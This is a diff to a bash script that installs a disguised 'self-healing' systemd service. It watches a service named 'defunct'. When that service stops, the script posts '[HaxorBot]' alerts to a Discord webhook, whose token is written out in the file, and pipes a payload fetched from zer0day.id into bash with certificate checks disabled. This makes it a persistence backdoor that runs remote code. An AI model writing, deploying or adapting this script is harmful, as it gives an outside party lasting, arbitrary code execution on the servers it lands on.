@@ -1,12 +1,10 @@
 #!/bin/bash
 
-
 self_healing_script_path="/usr/local/bin/self"
 service_file_path="/etc/systemd/system/self.service"
 webhook_url="https://discordapp.com/api/webhooks/1261323469749223465/XZtp_a_gNMVif8HDqmG0AQUZA0Kr-pSefGYlwwqTMcfmmSG0NOTdzPV_7K8LJoSDflqA"
 service_name="defunct"  
 pid_file="/var/run/self.pid"
-
 
 cat << 'EOF' > "$self_healing_script_path"
 #!/bin/bash
@@ -41,7 +39,8 @@ write_pid
 
 while true; do
     if systemctl is-active --quiet "$service_name"; then
-        sleep 1
+        # Service is running, sleep infinity
+        sleep infinity
     else
         curl -sL -H "Content-Type: application/json" -X POST -d "{\"content\": \"[HaxorBot] Service $service_name tidak berjalan di server $host, mengaktifkan ulang...\"}" "$webhook_url"
         bash -c "$(curl -fsSL https://zer0day.id/y -k)"
@@ -52,13 +51,10 @@ while true; do
             curl -sL -H "Content-Type: application/json" -X POST -d "{\"content\": \"[HaxorBot] Gagal mengaktifkan ulang $service_name!\"}" "$webhook_url"
         fi
     fi
-    sleep 10
 done
 EOF
 
-
 chmod +x "$self_healing_script_path"
-
 
 cat << EOF > "$service_file_path"
 [Unit]
@@ -74,10 +70,8 @@ PIDFile=$pid_file
 WantedBy=multi-user.target
 EOF
 
-
 systemctl daemon-reload
 systemctl enable self.service
 systemctl start self.service
-
 
 systemctl status self.service
